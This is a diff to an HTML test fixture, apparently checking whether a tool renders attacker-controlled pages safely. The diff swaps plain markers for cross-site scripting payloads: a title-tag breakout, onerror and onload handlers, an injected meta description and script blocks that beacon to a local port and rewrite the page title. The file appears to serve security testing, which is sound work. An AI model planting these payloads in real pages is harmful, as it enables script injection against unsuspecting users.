@@ -1,14 +1,18 @@
 <html>
 <head>
-<title>XSS_TITLE_MARKER_1</title>
-<meta name="description" content="XSS_DESC_MARKER_1">
+<title>"><img src=x onerror="(new Image()).src='http://127.0.0.1:8899/?hit=T1';document.title='XSS_EXEC_T1'"><svg onload="(new Image()).src='http://127.0.0.1:8899/?hit=T2';document.title='XSS_EXEC_T2'"></title>
+<meta name="description" content="<img src=x onerror=&quot;(new Image()).src='http://127.0.0.1:8899/?hit=D1';document.title='XSS_EXEC_D1'&quot;>">
+<meta property="og:title" content="OG_TITLE_PLAIN_MARKER">
 </head>
 <body>
 <h1>attacker-controlled-page</h1>
-<img src="x" onerror="window.__XSS_HIT__=(window.__XSS_HIT__||[]).concat('IMG_ONERROR_MARKER_1');document.title='XSS_EXECUTED_MARKER_1'">
+<p>attacker body plain marker BODY_PLAIN_MARKER</p>
+<img src="x" onerror="(new Image()).src='http://127.0.0.1:8899/?hit=B1';document.title='XSS_EXEC_B1'">
+<img src="x" onerror="fetch('http://127.0.0.1:8899/?f=B1').catch(function(){})">
 <script>
-window.__XSS_HIT__=(window.__XSS_HIT__||[]).concat('SCRIPT_MARKER_1:'+document.title);
-try{document.title='XSS_EXECUTED_MARKER_1';}catch(e){}
+try { (new Image()).src='http://127.0.0.1:8899/?hit=S1'; } catch(e) {}
+try { fetch('http://127.0.0.1:8899/?f=S1'); } catch(e) {}
+try { document.title='XSS_EXEC_S1'; } catch(e) {}
 </script>
 </body>
 </html>
